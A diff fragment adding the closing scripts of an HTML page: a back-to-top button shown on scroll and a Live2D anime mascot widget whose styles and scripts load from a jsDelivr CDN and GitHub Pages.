+        window.onscroll = function() {
+            
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        };
+    }
+
+    
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<script>   
+  const cdnPath = "https://cdn.jsdelivr.net/gh/0d000721999/live2d-test@f09405fd";
+  const cssPath = "https://0d000721999.github.io/waifu/waifu.css"
+  const config = {
+    
+    path: {
+      homePath: "/",
+      modelPath: cdnPath + "/Resources/",
+      cssPath: cssPath,
+      tipsJsonPath: cdnPath + "/waifu-tips.json",
+      tipsJsPath: cdnPath + "/waifu-tips.js",
+      live2dCorePath: cdnPath + "/Core/live2dcubismcore.js",
+      live2dSdkPath: cdnPath + "/live2d-sdk.js"
+    },
+    
+    tools: ["hitokoto", "asteroids", "express","photo", "quit"],
+    
+    drag: {
+      enable: true,
+      direction: ["x", "y"]
+    },
+    
+    switchType: "order"
+  }
+
+  
+  if (screen.width >= 768) {
+    Promise.all([
+      loadExternalResource(config.path.cssPath, "css"),
+      loadExternalResource(config.path.live2dCorePath, "js"),
+      loadExternalResource(config.path.live2dSdkPath, "js"),
+      loadExternalResource(config.path.tipsJsPath, "js")
+    ]).then(() => {
+      initWidget({
+        waifuPath: config.path.tipsJsonPath,
+        cdnPath: config.path.modelPath,
+        tools: config.tools,
+        dragEnable: config.drag.enable,
+        dragDirection: config.drag.direction,
+        switchType: config.switchType
+      });
+    });
+  }
+
+  
+  function loadExternalResource(url, type) {
+    return new Promise((resolve, reject) => {
+      let tag;
+      if (type === "css") {
+        tag = document.createElement("link");
+        tag.rel = "stylesheet";
+        tag.href = url;
+      }
+      else if (type === "js") {
+        tag = document.createElement("script");
+        tag.src = url;
+      }
+      if (tag) {
+        tag.onload = () => resolve(url);
+        tag.onerror = () => reject(url);
+        document.head.appendChild(tag);
+      }
+    });
+  }
+</script>
+
+    </body>
+</html>
